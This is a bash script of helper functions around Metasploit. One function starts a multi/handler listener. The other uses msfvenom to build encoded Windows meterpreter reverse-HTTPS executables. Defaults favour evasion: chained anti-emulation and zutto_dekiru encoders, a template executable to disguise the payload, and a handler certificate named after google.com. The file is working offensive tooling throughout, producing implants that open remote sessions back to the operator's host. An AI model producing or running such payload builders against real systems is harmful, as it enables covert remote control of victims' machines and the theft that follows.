#!/usr/bin/env bash
#
# Set capabilities on ruby
# Install rvm with
# rvm install ruby-version --disable-binary
# or
# rvm reinstall ruby-2.5.1 --disable-binary
# sudo setcap CAP_NET_BIND_SERVICE=+eip $HOME/.rvm/rubies/ruby-version/bin/ruby
#

MSF_FILES=$HOME/.msf4
MSF_PATH=/opt/msf
MSF_TEMPLATES=$MSF_FILES/templates
# RUBYVERSION=$(wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/.ruby-version -q -O - )

update-msf-encoders()
{
    (($MSF_PATH/msfvenom -l encoders) | grep -E "^.+/" | awk '{print $1}') > "${MSF_FILES}"/msf_encoders
}


update-msf-payloads()
{
    (($MSF_PATH/msfvenom -l payloads) | grep -E "^.+/" | awk '{print $1}') > "${MSF_FILES}"/msf_payloads
}


msf-console()
{
    sudo systemctl start postgresql &>/dev/null
    $MSF_PATH/msfconsole

}


_msf_handler_complete()
{
    COMPREPLY=()
    local cur_arg=${COMP_WORDS[COMP_CWORD],,}
    local prev_arg=${COMP_WORDS[COMP_CWORD-1],,}

    if [[ $cur_arg == -* ]]; then
        COMPREPLY=($( compgen -W "--arch --payload --stager --port --enable-stage-encoding --exit-on-session --ssl-check --ssl-cert" -- $cur_arg ) )
    else
        case $prev_arg in
            --payload)
                complete_words=$(cat $MSF_FILES/msf_payloads)
                COMPREPLY=( $( compgen -W "$complete_words" -- $cur_arg ) )
                ;;
            --arch)
                complete_words="x64 x86"
                COMPREPLY=( $( compgen -W "$complete_words" -- $cur_arg ) )
                ;;
            --stager)
                complete_words=$(cat $MSF_FILES/msf_encoders)
                COMPREPLY=( $( compgen -W "$complete_words" -- $cur_arg ) )
                ;;
            --port)
                complete_words="80 8080 8443 443 4444 5555"
                COMPREPLY=( $( compgen -W "$complete_words" -- $cur_arg ) )
                ;;
            --enable-stage-encoding)
                complete_words="true false"
                COMPREPLY=( $( compgen -W "$complete_words" -- $cur_arg ) )
                ;;
            --exit-on-session)
                complete_words="true false"
                COMPREPLY=( $( compgen -W "$complete_words" -- $cur_arg ) )
                ;;
            --ssl-check)
                complete_words="true false"
                COMPREPLY=( $( compgen -W "$complete_words" -- $cur_arg ) )
                ;;
            --ssl-cert)
                complete_words="$(for f in $(ls $MSF_FILES/certs/); do echo ${f}; done)"
                COMPREPLY=( $( compgen -W "$complete_words" -- $cur_arg ) )
                ;;
            *) ;;
        esac
    fi
}


msf-handler()
{
    local PRIMARY_IP=$(ip route get 1 | awk '{print $7;exit}')
    local LPORT=443
    local LHOST=$PRIMARY_IP
    local ARCH="x64"
    local PAYLOAD="windows/x64/meterpreter/reverse_https"
    local EXIT_ON_SESSION="false"
    local ENABLE_STAGE_ENCODING="true"
    local ENABLE_SSL_CHECK="true"
    local STAGER="x64/zutto_dekiru"
    local SSL_CERTS_PATH="$MSF_FILES/certs"
    local SSL_CHECK="true"
    local SSL_CERT="${SSL_CERTS_PATH}/google.com_pem.pem"

    function print_help
    {
        echo -e "\nUsage: ${FUNCNAME[1]} \r
            [--port (443)] \r
            [--arch (x64)] \r
            [--stager (x64/zutto_dekiru)] \r
            [--exit-on-session (false)] \r
            [--ssl-check (true)]\r
            [--ssl-cert (~/.msf4/certs/google.com_pem.pem)]\r
            [--enable-stage-encoding (true)]\n"
    }

    if [[ $1 =~ ^(-h|-H|--help|help)$ ]]; then
        print_help
    else
        while [[ $# -gt 1 ]]
        do
            case $1 in
                --port)
                    [ -n $2 ] && LPORT=$2
                    shift
                    ;;
                --arch)
                    [ -n $2 ] && ARCH=$2
                    shift
                    ;;
                --payload)
                    [ -n $2 ] && PAYLOAD=$2
                    shift ;;
                --stager)
                    [ -n $2 ] && STAGER=$2
                    shift
                    ;;
                --exit-on-session)
                    [ -n $2 ] && EXIT_ON_SESSION=$2
                    shift
                    ;;
                --enable-stage-encoding)
                    [ -n $2 ] && ENABLE_STAGE_ENCODING=$2
                    shift
                    ;;
                --ssl-check)
                    [ -n $2 ] && SSL_CHECK=$2
                    shift
                    ;;
                --ssl-cert)
                    [ -n $2 ] && SSL_CERT=$2
                    shift
                    ;;
                *)
                    echo "$(tput setaf 1)[!] Wrong option ${2}$(tput sgr0)"
                    print_help
                    return 1
                    ;;
            esac
            shift
        done


        ## we need database
        sudo systemctl start postgresql &>/dev/null

        if echo "${ENABLE_SSL_CHECK}"|grep -qEo "true"; then
            $MSF_PATH/msfconsole -x "spool $MSF_FILES/logs/metasploit.log; \
                use exploit/multi/handler; \
                set PAYLOAD ${PAYLOAD}; \
                set LHOST ${PRIMARY_IP}; \
                set LPORT ${LPORT}; \
                set ExitOnSession ${EXIT_ON_SESSION}; \
                set EnableStageEncoding ${ENABLE_STAGE_ENCODING}; \
                set StageEncoder ${STAGER}; \
                set StagerVerifySSLCert ${SSL_CHECK}; \
                set HandlerSSLCert ${SSL_CERT}; \
                exploit -j -z"
        else
            $MSF_PATH/msfconsole -x "spool $MSF_FILES/logs/metasploit.log; \
                use exploit/multi/handler; \
                set PAYLOAD ${PAYLOAD}; \
                set LHOST ${PRIMARY_IP}; \
                set LPORT ${LPORT}; \
                set ExitOnSession ${EXIT_ON_SESSION}; \
                set EnableStageEncoding ${ENABLE_STAGE_ENCODING}; \
                set StageEncoder ${STAGER}; \
                exploit -j -z"
        fi
    fi
    unset PRIMARY_IP LPORT LHOST ARCH PAYLOAD \
        EXIT_ON_SESSION ENABLE_STAGE_ENCODING STAGER \
        SSL_CERT SSL_CHECK
    return 0
}
complete -F _msf_handler_complete msf-handler


_msf_payload_complete()
{
    COMPREPLY=()
    local cur_arg=${COMP_WORDS[COMP_CWORD]}
    local prev_arg=${COMP_WORDS[COMP_CWORD-1]}

    if [[ $cur_arg == -* ]]; then
        COMPREPLY=($( compgen -W "--arch --platform --payload --encoder --port --template --host-ip --out-file --iterations --ssl-check --ssl-cert" -- $cur_arg ) )
    else
        case $prev_arg in
            --payload)
                complete_words=$(cat $MSF_FILES/msf_payloads)
                COMPREPLY=( $( compgen -W "$complete_words" -- $cur_arg ) )
                ;;
            --arch)
                complete_words="x64 x86"
                COMPREPLY=( $( compgen -W "$complete_words" -- $cur_arg ) )
                ;;
            --encoder)
                complete_words=$(cat $MSF_FILES/msf_encoders)
                COMPREPLY=( $( compgen -W "$complete_words" -- $cur_arg ) )
                ;;
            --iterations)
                complete_words="2 3 4 5"
                COMPREPLY=( $( compgen -W "$complete_words" -- $cur_arg ) )
                ;;
            --platform)
                complete_words="windows linux"
                COMPREPLY=( $( compgen -W "$complete_words" -- $cur_arg ) )
                ;;
            --port)
                complete_words="80 8080 8443 443 4444 5555"
                COMPREPLY=( $( compgen -W "$complete_words" -- $cur_arg ) )
                ;;
            --template)
                complete_words="$(for f in $(ls $MSF_FILES/templates/x86/); do echo x86/${f}; done)"
                complete_words+=" $(for f in $(ls $MSF_FILES/templates/x64/); do echo x64/${f}; done)"
                COMPREPLY=( $( compgen -W "$complete_words" -- $cur_arg ) )
                ;;
            --host-ip)
                ## list all available IPs when choosing this option
                complete_words=$(ip -o addr | awk '!/^[0-9]*: ?lo|link/ {print $4}'|sed 's/\(.*\)\/.*/\1/g')
                COMPREPLY=( $( compgen -W "$complete_words" -- $cur_arg ) )
                ;;
            --out-file)
                complete_words=" "
                COMPREPLY=( $( compgen -W "$complete_words" -- $cur_arg ) )
                ;;
            --ssl-check)
                complete_words="true false"
                COMPREPLY=( $( compgen -W "$complete_words" -- $cur_arg ) )
                ;;
            --ssl-cert)
                complete_words="$(for f in $(ls $MSF_FILES/certs/); do echo ${f}; done)"
                COMPREPLY=( $( compgen -W "$complete_words" -- $cur_arg ) )
                ;;
            *)
                ;;
        esac
    fi
}


msf-payload()
{
    local PORT="443"
    local ARCH="x64"
    local PLATFORM="windows"
    local PAYLOAD="windows/x64/meterpreter/reverse_https"
    local ENCODER="x64/anti_emu,x64/zutto_dekiru,x64/anti_emu"
    local ITERATIONS="1"
    local TEMPLATE_FILE=$(ls ${MSF_TEMPLATES}/x64/csb_*)
    local TEMPLATE=x64/${TEMPLATE_FILE##*/}
    local HOST_IP=$(ip route get 1 | awk '{print $7;exit}')
    local MSF_TEMPLATE_PATH="$MSF_FILES/templates"
    local OUT_FILE="$PWD/meterpreter_${PORT}_${ARCH}_${HOST_IP}.exe"
    local SSL_CHECK="true"
    local SSL_CERTS_PATH="$MSF_FILES/certs"
    local SSL_CERT="${SSL_CERTS_PATH}/google.com_pem.pem"

    function print_help
    {
        echo -e "Usage: ${FUNCNAME[1]} \r
            [--port (443)] \r
            [--arch (x64)] \r
            [--platform (windows)] \r
            [--payload (windows/x64/meterpreter/reverse_https)] \r
            [--encoder (x64/zutto_dekiru,x64/xor,x64/zutto_dekiru)] \r
            [--template (you know what is wat)] \r
            [--host-ip (default ip)] \r
            [--out-file (\$PWD)] \r
            [--ssl-check (true)] \r
            [--ssl-cert (~/.msf4/certs/google.com_pem.pem)] \r
            [--iterations (1)]\n"
    }

    if [[ $1 =~ ^(-h|-H|--help|help)$ ]]; then
        print_help
    else
        while [[ $# -gt 1 ]]; do
            case $1 in
                --port)
                    [ -n $2 ] && PORT=$2
                    shift
                    ;;
                --arch)
                    [ -n $2 ] && ARCH=$2
                    shift
                    ;;
                --platform)
                    [ -n $2 ] && PLATFORM=$2
                    shift
                    ;;
                --payload)
                    [ -n $2 ] && PAYLOAD=$2
                    shift
                    ;;
                --encoder)
                    [ -n $2 ] && ENCODER=$2
                    shift
                    ;;
                --iterations)
                    [ -n $2 ] && ITERATIONS=$2
                    shift
                    ;;
                --template)
                    [ -n $2 ] && TEMPLATE=$2
                    shift
                    ;;
                --host-ip)
                    [ -n $2 ] && HOST_IP=$2
                    shift
                    ;;
                --out-file)
                    [ -n $2 ] && OUT_FILE=$2
                    shift
                    ;;
                --ssl-check)
                    [ -n $2 ] && SSL_CHECK=$2
                    shift
                    ;;
                --ssl-cert)
                    [ -n $2 ] && SSL_CERT=$2
                    shift
                    ;;
                *)
                    echo "$(tput setaf 1)[!] Wrong option ${2}$(tput sgr0)"
                    print_help
                    return 1
                    ;;
            esac
            shift
        done

        echo "$(tput bold)$(tput setaf 2)[+] OUTPUT$(tput sgr0)"
        echo "$(tput setaf 3)"

        if echo $SSL_CHECK|grep -qiEo "true"; then
            $MSF_PATH/msfvenom \
                --arch ${ARCH} \
                --platform ${PLATFORM} \
                --payload ${PAYLOAD} \
                HandlerSSLCert="${SSL_CERT}" \
                StagerVerifySSLCert="${SSL_CHECK}" \
                LHOST=${HOST_IP} \
                LPORT=${PORT} \
                --encoder "@${ENCODER}" \
                --iterations ${ITERATIONS} \
                --template ${MSF_TEMPLATE_PATH}/${TEMPLATE} \
                --format exe-only \
                --out ${OUT_FILE}
        else
            $MSF_PATH/msfvenom \
                --arch ${ARCH} \
                --platform ${PLATFORM} \
                --payload ${PAYLOAD} \
                LHOST=${HOST_IP} \
                LPORT=${PORT} \
                --encoder "@${ENCODER}" \
                --iterations ${ITERATIONS} \
                --template ${MSF_TEMPLATE_PATH}/${TEMPLATE} \
                --format exe-only \
                --out ${OUT_FILE}
        fi
        echo "$(tput sgr0)"

        echo "$(tput bold)$(tput setaf 2)[+] COMMAND $(tput sgr0)"
        echo "$(tput setaf 2)Command used:"
        if echo $SSL_CHECK|grep -qEo "true"; then
            echo "$MSF_PATH/msfvenom -a ${ARCH} --platform ${PLATFORM} -p ${PAYLOAD} LHOST=${HOST_IP} LPORT=${PORT} HandlerSSLCert=${SSL_CERT} StagerVerifySSLCert=${SSL_CHECK} -e "@${ENCODER}" -i ${ITERATIONS} -x ${MSF_TEMPLATE_PATH}/${TEMPLATE} -f exe-only -o ${OUT_FILE}"
        else
            echo "$MSF_PATH/msfvenom -a ${ARCH} --platform ${PLATFORM} -p ${PAYLOAD} LHOST=${HOST_IP} LPORT=${PORT} -e "@${ENCODER}" -i ${ITERATIONS} -x ${MSF_TEMPLATE_PATH}/${TEMPLATE} -f exe-only -o ${OUT_FILE}"
        fi
        echo

        if [ -f "${OUT_FILE}" ]; then
            echo "$(tput bold)$(tput setaf 2)[+] PAYLOAD GENERATED: ${OUT_FILE}$(tput sgr0)"
            echo
        else
            echo "$(tput bold)$(tput setaf 1)[!] ERROR: Failed to create payload$(tput sgr0)"
            echo
            return 1
        fi
    fi
    return 0
    unset LPOPT ARCH PLATFORM \
        PAYLOAD ENCODER TEMPLATE HOST_IP \
        MSF_TEMPLATE_PATH SSL_CHECK SSL_CERT SSL_CERTS_PATH
}
complete -F _msf_payload_complete msf-payload
